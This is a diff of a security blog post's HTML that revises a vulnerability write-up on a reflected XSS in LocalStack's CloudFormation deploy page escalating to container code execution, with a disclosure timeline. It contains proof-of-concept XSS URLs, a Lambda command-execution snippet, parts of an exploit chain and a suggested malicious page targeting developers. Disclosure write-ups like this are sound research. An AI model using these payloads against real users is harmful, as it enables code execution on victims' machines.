@@ -10,11 +10,10 @@
  
 
 
-      <title>Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE - </title>
+      <title>From Reflected XSS to Container RCE in LocalStack via CloudFormation Deploy UI - </title>
 
-  <meta name="description" content="What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.
-Once installed the localstack can be started:
-(venv) ┌──(cyberroute)-[~/Development/localstack_code] └─$ localstack start -d __ _______ __ __ / / ____ _________ _/ / ___// /_____ ______/ /__ / / / __ \/ ___/ __ `/ /\__ \/ __/ __ `/ ___/ //_/ / /___/ /_/ / /__/ /_/ / /___/ / /_/ /_/ / /__/ ,&lt; /_____/\____/\___/\__,_/_//____/\__/\__,_/\___/_/|_| - LocalStack CLI: 4.">
+  <meta name="description" content="What is LocalStack and how to quickly start it? LocalStack is a popular open-source platform that emulates AWS services locally, allowing developers to build and test cloud infrastructure without touching real AWS accounts.
+Because LocalStack runs on localhost and is marketed as a development-only tool, its security surface is often underestimated. During a short exploration of LocalStack’s CloudFormation features, I discovered a broken deployment UI that led to a reflected XSS vulnerability.">
   <meta name="author" content="Alessandro Bresciani"/><script type="application/ld+json">
 {
     "@context": "http://schema.org",
@@ -51,7 +50,7 @@ Once installed the localstack can be started:
         "position": 3,
         "item": {
           "@id": "https:\/\/cyberroute.github.io\/post\/2025-12-11-localstack-hack\/",
-          "name": "Attacking localstack with the help of a broken cloud formation external feature got me an xss to rce"
+          "name": "From reflected xss to container rce in local stack via cloud formation deploy ui"
         }
     }]
 }
@@ -62,10 +61,10 @@ Once installed the localstack can be started:
   "author": {
     "name" : "Alessandro Bresciani"
   },
-  "headline": "Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE",
-  "description" : "What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.\nOnce installed the localstack can be started:\n(venv) ┌──(cyberroute)-[~\/Development\/localstack_code] └─$ localstack start -d __ _______ __ __ \/ \/ ____ _________ _\/ \/ ___\/\/ \/_____ ______\/ \/__ \/ \/ \/ __ \\\/ ___\/ __ \u0060\/ \/\\__ \\\/ __\/ __ \u0060\/ ___\/ \/\/_\/ \/ \/___\/ \/_\/ \/ \/__\/ \/_\/ \/ \/___\/ \/ \/_\/ \/_\/ \/ \/__\/ ,\u0026lt; \/_____\/\\____\/\\___\/\\__,_\/_\/\/____\/\\__\/\\__,_\/\\___\/_\/|_| - LocalStack CLI: 4.",
+  "headline": "From Reflected XSS to Container RCE in LocalStack via CloudFormation Deploy UI",
+  "description" : "What is LocalStack and how to quickly start it? LocalStack is a popular open-source platform that emulates AWS services locally, allowing developers to build and test cloud infrastructure without touching real AWS accounts.\nBecause LocalStack runs on localhost and is marketed as a development-only tool, its security surface is often underestimated. During a short exploration of LocalStack’s CloudFormation features, I discovered a broken deployment UI that led to a reflected XSS vulnerability.",
   "inLanguage" : "en",
-  "wordCount":  2026 ,
+  "wordCount":  2127 ,
   "datePublished" : "2025-12-11T10:10:12",
   "dateModified" : "2025-12-11T10:10:12",
   "image" : "https:\/\/cyberroute.github.io\/img\/avatar-icon.png",
@@ -84,17 +83,16 @@ Once installed the localstack can be started:
 }
 </script>
 
-<meta property="og:title" content="Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE" />
-<meta property="og:description" content="What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.
-Once installed the localstack can be started:
-(venv) ┌──(cyberroute)-[~/Development/localstack_code] └─$ localstack start -d __ _______ __ __ / / ____ _________ _/ / ___// /_____ ______/ /__ / / / __ \/ ___/ __ `/ /\__ \/ __/ __ `/ ___/ //_/ / /___/ /_/ / /__/ /_/ / /___/ / /_/ /_/ / /__/ ,&lt; /_____/\____/\___/\__,_/_//____/\__/\__,_/\___/_/|_| - LocalStack CLI: 4.">
+<meta property="og:title" content="From Reflected XSS to Container RCE in LocalStack via CloudFormation Deploy UI" />
+<meta property="og:description" content="What is LocalStack and how to quickly start it? LocalStack is a popular open-source platform that emulates AWS services locally, allowing developers to build and test cloud infrastructure without touching real AWS accounts.
+Because LocalStack runs on localhost and is marketed as a development-only tool, its security surface is often underestimated. During a short exploration of LocalStack’s CloudFormation features, I discovered a broken deployment UI that led to a reflected XSS vulnerability.">
 <meta property="og:image" content="https://cyberroute.github.io/img/avatar-icon.png" />
 <meta property="og:url" content="https://cyberroute.github.io/post/2025-12-11-localstack-hack/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="Blog" />
 
-  <meta name="twitter:title" content="Attacking Localstack with the help of a broken CloudFormation external …" />
-  <meta name="twitter:description" content="What is Localstack and how to quick start it? Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python …">
+  <meta name="twitter:title" content="From Reflected XSS to Container RCE in LocalStack via CloudFormation …" />
+  <meta name="twitter:description" content="What is LocalStack and how to quickly start it? LocalStack is a popular open-source platform that emulates AWS services locally, allowing developers to build and test cloud infrastructure without …">
   <meta name="twitter:image" content="https://cyberroute.github.io/img/avatar-icon.png" />
   <meta name="twitter:card" content="summary_large_image" />
   <link href='https://cyberroute.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
@@ -256,7 +254,7 @@ Once installed the localstack can be started:
           <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
               <div class="post-heading">
-                <h1>Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE</h1>
+                <h1>From Reflected XSS to Container RCE in LocalStack via CloudFormation Deploy UI</h1>
                   
                   
                     <span class="post-meta">
@@ -290,7 +288,7 @@ Once installed the localstack can be started:
           <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
             <div class="post-heading">
               
-                <h1>Attacking Localstack with the help of a broken CloudFormation external feature got me an XSS to RCE</h1>
+                <h1>From Reflected XSS to Container RCE in LocalStack via CloudFormation Deploy UI</h1>
               
               
               
@@ -326,9 +324,10 @@ Once installed the localstack can be started:
   <div class="row">
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <article role="main" class="blog-post">
-        <h1 id="what-is-localstack-and-how-to-quick-start-it">What is Localstack and how to quick start it?</h1>
-<p>Localstack is an open-source project, intended for developers, that emulates AWS services, it runs in a local container. It is entirely written in Python and seemed interesting enough to look into it.</p>
-<p>Once installed the localstack can be started:</p>
+        <h1 id="what-is-localstack-and-how-to-quickly-start-it">What is LocalStack and how to quickly start it?</h1>
+<p>LocalStack is a popular open-source platform that emulates AWS services locally, allowing developers to build and test cloud infrastructure without touching real AWS accounts.</p>
+<p>Because LocalStack runs on <code>localhost</code> and is marketed as a development-only tool, its security surface is often underestimated. During a short exploration of LocalStack’s CloudFormation features, I discovered a broken deployment UI that led to a <strong>reflected XSS vulnerability</strong>. When combined with LocalStack’s permissive defaults, this XSS escalated to <strong>arbitrary code execution on the local container</strong>.</p>
+<p>Once installed, LocalStack can be started:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ┌──<span style="color:#f92672">(</span>cyberroute<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Development/localstack_code<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ localstack start -d
 </span></span><span style="display:flex;"><span>
@@ -344,10 +343,10 @@ Once installed the localstack can be started:
 </span></span><span style="display:flex;"><span>- App: https://app.localstack.cloud
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:34:21<span style="color:#f92672">]</span> starting LocalStack in Docker mode 🐳                                                                                         
-</span></span></code></pre></div><p>At this stage it is possible to login at <a href="https://app.localstack.cloud">https://app.localstack.cloud</a> and access the platform with an authenticated access via either Github/Google or whatever:</p>
+</span></span></code></pre></div><p>At this stage, it is possible to log in at <a href="https://app.localstack.cloud">https://app.localstack.cloud</a> and access the platform using authentication via GitHub, Google, or similar providers:</p>
 <p><img src="/images/localstack.png" alt="alt"></p>
-<p>Now, what is the AWS service that executes code, well there is a few right? But the one and only Lambda functions are the very best for doing that, so my tests started right there! I did not even bother to read the code at the start of this research.</p>
-<p>So I put together a simple lambda function that looks something like:</p>
+<p>To understand the execution model, I started with AWS Lambda, since it is the most straightforward service for arbitrary code execution.</p>
+<p>So I put together a simple Lambda function that looks something like:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handler</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">execSync</span>} <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">import</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;id&#39;</span>).<span style="color:#a6e22e">toString</span>();
@@ -371,11 +370,13 @@ Once installed the localstack can be started:
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ┌──<span style="color:#f92672">(</span>cyberroute<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Development/evilambda<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat output.txt
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;uid=993(sbx_user1051) gid=990 groups=990,0(root)\n&#34;</span>%
-</span></span></code></pre></div><p>That is interesting, the same would work also on AWS, but with the difference that the sandbox user is not part of the group root which makes a lot of sense when thinking about container security (not in context with the write-up though)</p>
+</span></span></code></pre></div><p>That is interesting, the same would work also on AWS, but with the difference that the sandbox user is not part of the group root which makes a lot of sense when considering container security.</p>
 <p><img src="/images/lambda.png" alt="alt"></p>
-<p>So far I have been just learning about the product and clicking around to understand how it works. So I go on the <a href="https://docs.localstack.cloud/">https://docs.localstack.cloud/</a> to read more about Localstack, browsing around I find an interesting external feature that looks like the below:</p>
+<p>Before diving into the UI, I confirmed how LocalStack executes Lambda functions. As expected, Lambda code runs as real Node.js processes on the host (or container), which becomes critical later in the exploit chain.</p>
+<p>I then returned to the LocalStack documentation to explore additional features. While browsing, I found an interesting one that looks like the following:</p>
 <p><img src="/images/deploy.png" alt="alt"></p>
-<p>I visit that URL and I end up onto an apparently broken feature that seems to be intended to deploy CloudFormation templates as templateURL query paramenter. Full dump of the source code:</p>
+<p>I visited that URL and ended up on an apparently broken feature that seems intended to deploy CloudFormation templates via a <code>templateURL</code> query parameter.</p>
+<p>Full dump of the source code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">LocalStack</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">CloudFormation</span> <span style="color:#a6e22e">Deployment</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/title&gt;</span>
@@ -518,28 +519,40 @@ Once installed the localstack can be started:
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/body&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/html&gt;</span>
-</span></span></code></pre></div><p>Without a doubt a broken feature but seems interesting to look into:</p>
+</span></span></code></pre></div><p>Without a doubt, this feature appeared incomplete or broken—but its position in the request flow made it particularly interesting from a security perspective:</p>
 <p><img src="/images/broken.png" alt="alt"></p>
-<p>this code from the page tells me that the URL is constructed as per documentation and looks like http://localhost:4566/_localstack/cloudformation/deploy?templateURL=</p>
+<p>This code from the page shows that the URL is constructed according to the documentation <code>http://localhost:4566/_localstack/cloudformation/deploy?templateURL=</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">templateURL</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">queryParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;templateURL&#34;</span>);
-</span></span></code></pre></div><p>first attempt that worked immediately was the most silly one:</p>
+</span></span></code></pre></div><p>At this point, I tested the most basic input-reflection scenario:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost:4566/_localstack/cloudformation/deploy?templateURL<span style="color:#f92672">=</span>%3Cscript%3Ealert<span style="color:#f92672">(</span>%27XSS%20via%20templateBody%27<span style="color:#f92672">)</span>%3C/script%3E
-</span></span></code></pre></div><p>worked first shot! no code review no fancy stuff, so I got a reflected XSS</p>
+</span></span></code></pre></div><ul>
+<li>
+<p>The payload executed immediately.</p>
+</li>
+<li>
+<p>No sanitization. No escaping. No templating context awareness.</p>
+</li>
+<li>
+<p>This confirmed a classic reflected XSS vulnerability in a privileged LocalStack UI running on localhost.</p>
+</li>
+</ul>
 <p><img src="/images/xss.png" alt="alt"></p>
-<p>Indeed the injected javascript code was reflected in the page source code :)</p>
+<p>Indeed, the injected JavaScript code was reflected directly in the page source.</p>
 <p><img src="/images/render.png" alt="alt"></p>
-<p>Time to look at the vulnerable code, which was silently removed by the vendor (after my 2 reports) <a href="https://github.com/localstack/localstack/pull/13293/">https://github.com/localstack/localstack/pull/13293/</a></p>
+<p>Time to look at the vulnerable code, which was silently removed by the vendor (after my two reports) <a href="https://github.com/localstack/localstack/pull/13293/">https://github.com/localstack/localstack/pull/13293/</a></p>
 <p><img src="/images/pr.png" alt="alt"></p>
-<p>Pr merged on 24th of October 2025, where as my first report to CEO and Senior management promptly happened on the 17th of October 2025</p>
+<p>The PR was merged on October 24th, 2025, whereas my first report was submitted on October 17th, 2025.</p>
 <p><img src="/images/report.png" alt="alt"></p>
+<p>Second report with RCE escalation on October 20th, 2025:</p>
+<p><img src="/images/report_rce.png" alt="alt"></p>
 <h1 id="the-vulnerability">The Vulnerability</h1>
 <p>The core issue is on lines 44-45:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> params<span style="color:#f92672">.</span>items():
 </span></span><span style="display:flex;"><span>    deploy_html <span style="color:#f92672">=</span> deploy_html<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;&#34;</span>, value)
 </span></span></code></pre></div><p>This performs simple string replacement directly into HTML without any HTML escaping. The code inserts user-controlled
 data (from the templateURL parameter) into the HTML response.</p>
-<p>Attack Vector</p>
+<h3 id="attack-vector">Attack Vector</h3>
 <p>When you access the URL with a malicious templateURL:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">templateURL</span><span style="color:#f92672">=&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;XSS&#39;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
 </span></span></code></pre></div><p>Here&rsquo;s what happens:</p>
@@ -550,10 +563,10 @@ data (from the templateURL parameter) into the HTML response.</p>
 - The exception e on line 39 contains the malicious URL
 - The error message becomes: &ldquo;Unable to download CloudFormation template URL: [exception details including the
 malicious URL]&rdquo;
-- Line 41: <code>json.dumps()</code> encodes the message, but JSON encoding alone doesn&rsquo;t prevent XSS in HTML context</li>
+- Line 41: <code>json.dumps()</code> encodes the message, JSON encoding alone does not prevent XSS when data is injected into an HTML or JavaScript context.</li>
 <li>Line 45: The JSON-encoded string (which still contains the script tags) is inserted directly into the HTML using
 string replacement</li>
-<li>The Browser: When the browser renders the HTML, if the value is placed in an unsafe context in the deploy.html
+<li>The browser: When the browser renders the HTML, if the value is placed in an unsafe context in the deploy.html
 template (like outside of a properly quoted attribute, or in a script context), the JavaScript executes.</li>
 </ol>
 <p>This is a reflected XSS vulnerability that could allow attackers to execute arbitrary JavaScript in users&rsquo; browsers when they click on a malicious link.</p>
@@ -606,6 +619,7 @@ template (like outside of a properly quoted attribute, or in a script context), 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span>          <span style="color:#66d9ef">return</span> Response(deploy_html, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span>)
 </span></span></code></pre></div><h1 id="exploitation-chain">Exploitation Chain</h1>
 <p><strong>Malicious URL:</strong></p>
+<p>Once JavaScript execution was achieved, escalating to RCE required no additional vulnerabilities—only intended LocalStack functionality.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost:4566/_localstack/cloudformation/deploy?templateURL<span style="color:#f92672">=</span>&lt;/script&gt;&lt;script&gt;<span style="color:#f92672">[</span>PAYLOAD<span style="color:#f92672">]</span>&lt;/script&gt;
 </span></span></code></pre></div><p><strong>JavaScript Payload</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
@@ -663,7 +677,7 @@ template (like outside of a properly quoted attribute, or in a script context), 
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <h2 id="technical-analysis">Technical Analysis</h2>
-<p>User input is inserted into HTML via string replacement without escaping. LocalStack runs on <code>localhost:4566</code>, accessible from browser JavaScript. LocalStack allows cross-origin requests for development convenience. LocalStack accepts dummy credentials (<code>test/test</code>) by default. Lambda functions execute as actual Node.js/Python processes on the host. The deploy UI loads AWS SDK, making it available to injected scripts.</p>
+<p>User input is inserted into HTML via string replacement without escaping. LocalStack runs on <code>localhost:4566</code>, accessible from browser JavaScript. LocalStack allows cross-origin requests by default for development convenience. LocalStack accepts dummy credentials (<code>test/test</code>) by default. Lambda functions execute as actual Node.js/Python processes on the host. The deploy UI loads AWS SDK, making it available to injected scripts.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/aws-sdk/2.1015.0/aws-sdk.js&#34;</span>&gt;&lt;/script&gt;
 </span></span></code></pre></div><h3 id="attack-flow-diagram">Attack Flow Diagram</h3>
 <pre tabindex="0"><code>┌─────────────────────────────────────────────────────────────────┐
@@ -719,7 +733,8 @@ template (like outside of a properly quoted attribute, or in a script context), 
  
 
 <h1 id="impact">Impact?</h1>
-<p>Think about hosting a page like the below on a domain whatever.com, then post it around social media&hellip; No CSRF protection, exploit would work at default and execute automatically! Target? Developers.</p>
+<p>Consider hosting a page like the following on an arbitrary domain and distributing it via social media or chat platforms. With no CSRF protection, the exploit would work by default and execute automatically! Target: developers.</p>
+<p>LocalStack exposes powerful APIs, accepts default credentials, disables CORS protections, and executes user-supplied code. Any browser-level vulnerability in such a tool should be treated as <strong>equivalent to local code execution</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
@@ -739,12 +754,12 @@ template (like outside of a properly quoted attribute, or in a script context), 
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
 </span></span></code></pre></div><h1 id="disclosure-timeline-and-thoughts">Disclosure Timeline and Thoughts</h1>
-<p>I reported this vulnerability promptly on October 17th, 2025, followed by a detailed escalation chain (XSS → CloudFormation → Lambda → RCE) on October 20th, 2025. The vulnerable feature was silently removed via <a href="https://github.com/localstack/localstack/pull/13293/">PR #13293</a> on October 24th, 2025.
+<p>I reported this vulnerability promptly on October 17th, 2025, followed by a detailed escalation chain (XSS → CloudFormation → Lambda → RCE) on October 20th, 2025. The vulnerable feature was removed via <a href="https://github.com/localstack/localstack/pull/13293/">PR #13293</a> on October 24th, 2025.
 While I appreciate that the vulnerability was addressed quickly, I was disappointed by the lack of communication throughout the process. No acknowledgment was received for either report, and the fix was deployed without notifying me or issuing a public security advisory.
 Looking at the PR itself, you can see the vulnerable code was simply removed—no mention of the security implications, no CVE assignment, and no notification to users that they should update immediately due to a critical RCE vulnerability.
 From a researcher&rsquo;s perspective, this represents a missed opportunity for collaboration. More importantly, from a user security perspective, LocalStack&rsquo;s developer community deserved transparency about this critical vulnerability that could have enabled remote code execution on their machines.
 Security researchers invest significant time identifying and responsibly disclosing vulnerabilities. A simple acknowledgment and coordination on disclosure timing would go a long way in encouraging continued security research that benefits the entire community.
-That said, the research itself was fascinating, and I hope this writeup helps other developers understand the risks of running development tools that expose localhost services.</p>
+That said, the research itself was fascinating, and I hope this write-up helps other developers understand the risks of running development tools that expose localhost services.</p>
 <h1 id="affected-version">Affected Version</h1>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>localstack-core<span style="color:#f92672">==</span>4.9.2
 </span></span></code></pre></div>
